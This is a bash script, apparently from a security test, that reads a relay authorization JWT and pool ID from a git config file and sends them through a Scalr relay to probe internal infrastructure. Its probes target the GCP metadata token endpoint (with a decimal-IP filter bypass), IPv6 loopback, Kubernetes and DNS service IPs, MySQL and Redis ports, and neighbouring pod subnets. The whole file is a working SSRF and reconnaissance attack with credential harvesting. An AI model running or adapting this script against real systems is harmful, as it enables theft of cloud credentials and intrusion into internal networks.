#!/bin/bash
# Comprehensive relay internal scan from inside VPC
JWT=$(grep -oP '(?<=x-relay-authorization:)\S+' "$XDG_CONFIG_HOME/git/config" 2>/dev/null)
POOL=$(grep -oiP '(?<=x-relay-agent-pool-id:)\S+' "$XDG_CONFIG_HOME/git/config" 2>/dev/null)

echo "[agent_ip] $(hostname -I 2>/dev/null)"
echo "[jwt_len] ${#JWT}"

relay_probe() {
  local label=$1 url=$2
  shift 2
  CODE=$(curl -sS -o /tmp/rp_out.txt -w "%{http_code}" "$@" \
    -H "x-relay-authorization: $JWT" \
    -H "X-Relay-Agent-Pool-ID: $POOL" \
    --max-time 5 \
    "https://relay.main.scalr.dev/$url" 2>/tmp/rp_err.txt)
  BODY=$(cat /tmp/rp_out.txt | head -c 300 | tr '\n' ' ')
  ERR=$(cat /tmp/rp_err.txt | tail -1)
  echo "[relay] $label → HTTP $CODE | body: $BODY | err: $ERR"
}

# === Bypass candidates for GCP metadata ===
relay_probe "decimal-169.254.169.254" "http://2852039166/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

relay_probe "localtest.me-127.0.0.1" "http://localtest.me/"

# IPv6 loopback (not in FORBIDDEN_NETWORKS)
relay_probe "ipv6-loopback" "http://[::1]/"

# Kubernetes API via IP (service CIDR might differ)
relay_probe "k8s-api-svc-cidr" "https://10.20.2.1/"

# Internal GKE services (try common svc IPs)
relay_probe "kube-dns" "http://10.20.2.10/"

# Scalr internal services 
relay_probe "internal-main-lb" "https://internal.main.scalr.dev/ping"
relay_probe "otel-http" "http://10.30.30.3:8888/metrics"

# MySQL/Redis (common internal ports)
relay_probe "mysql-3306" "http://10.30.0.1:3306/"
relay_probe "redis-6379" "http://10.30.0.1:6379/"

# Agent pod subnet probe
MY_IP=$(hostname -I | awk '{print $1}')
echo "[my_ip] $MY_IP"
# Try gateway/other pods in same subnet
SUBNET=$(echo "$MY_IP" | sed 's/\.[0-9]*$//')
relay_probe "subnet-gateway" "http://${SUBNET}.1/"
relay_probe "subnet-2" "http://${SUBNET}.2/"

echo "[done]"
